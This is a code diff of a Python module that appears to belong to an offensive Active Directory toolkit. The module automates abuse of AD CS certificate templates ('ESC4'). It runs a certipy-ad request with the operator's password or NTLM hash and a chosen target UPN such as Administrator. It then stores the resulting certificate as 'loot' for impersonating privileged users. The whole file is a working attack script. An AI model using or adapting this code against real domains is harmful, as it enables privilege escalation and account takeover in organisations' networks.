@@ -1,11 +1,10 @@
-# modules/adcs/esc4.py
-
 import os
 from core.helpers import run_command, save_loot
 from core.colors import blue, green, red, yellow
 
 def abuse_esc4(session, template):
-    print(blue(f"[*] Starting ESC4 Abuse using template: {template}"))
+    print(blue("[>] ESC4: Abusing certificate template that allows client-specified UPN."))
+    print(yellow("[*] This lets us request a certificate with any UPN, enabling impersonation of privileged users."))
 
     cas = session.adcs_metadata.get("cas", [])
     if not cas:
@@ -17,14 +16,6 @@ def abuse_esc4(session, template):
         print(red("[-] Invalid CA name in session metadata."))
         return
 
-    # Step 1: Backup original template
-    if session.hash:
-        auth = f"-u {session.username} -hashes :{session.hash}"
-    elif session.password:
-        auth = f"-u {session.username} -p '{session.password}'"
-
-
-    # Step 2: Ask target UPN to impersonate
     target_upn = input(f"[?] Enter target UPN (e.g., Administrator@{session.domain}): ").strip()
     if not target_upn or "@" not in target_upn:
         print(red("[-] Invalid UPN format."))
@@ -32,26 +23,32 @@ def abuse_esc4(session, template):
 
     output_file = f"esc4_{target_upn.split('@')[0]}.pfx"
 
-    # Step 3: Build certipy-ad req command
+    if session.hash:
+        auth = f"-u {session.username} -hashes :{session.hash}"
+    elif session.password:
+        auth = f"-u {session.username} -p '{session.password}'"
+    else:
+        print(red("[-] No valid authentication method provided."))
+        return
+
     req_cmd = (
-        f"certipy-ad req {auth} "
-        f"-dc-ip {session.dc_ip} -ca '{ca_name}' "
+        f"certipy-ad req {auth} -dc-ip {session.dc_ip} -ca '{ca_name}' "
         f"-template '{template}' -upn '{target_upn}' -out {output_file}"
     )
 
-    print(blue(f"[*] Requesting certificate as '{target_upn}' via updated template... \n Press Enter.."))
+    print(blue(f"[*] Requesting certificate as '{target_upn}' using template '{template}'..."))
     out, err = run_command(req_cmd)
-    print(out)
-    if err:
-        print(red(err.strip()))
+    print(out.strip() or err.strip())
 
-    # Step 4: Check if file was created
     if os.path.exists(output_file) and os.path.getsize(output_file) > 100:
         with open(output_file, "rb") as f:
             save_loot(output_file, f.read(), binary=True)
         print(green(f"[+] Certificate saved to loot/{output_file}"))
+        print(green(f"[+] UPN used: {target_upn}"))
+        print(green("[+] Certificate request successful!"))
     else:
         print(red("[-] Certificate request failed or file not created."))
-        return
+        print(yellow("[!] If the attack failed, try rerunning the command or run it manually. It may be a temporary connection issue."))
 
-
+    print(yellow(f"[*] Command executed: {req_cmd}"))
+    
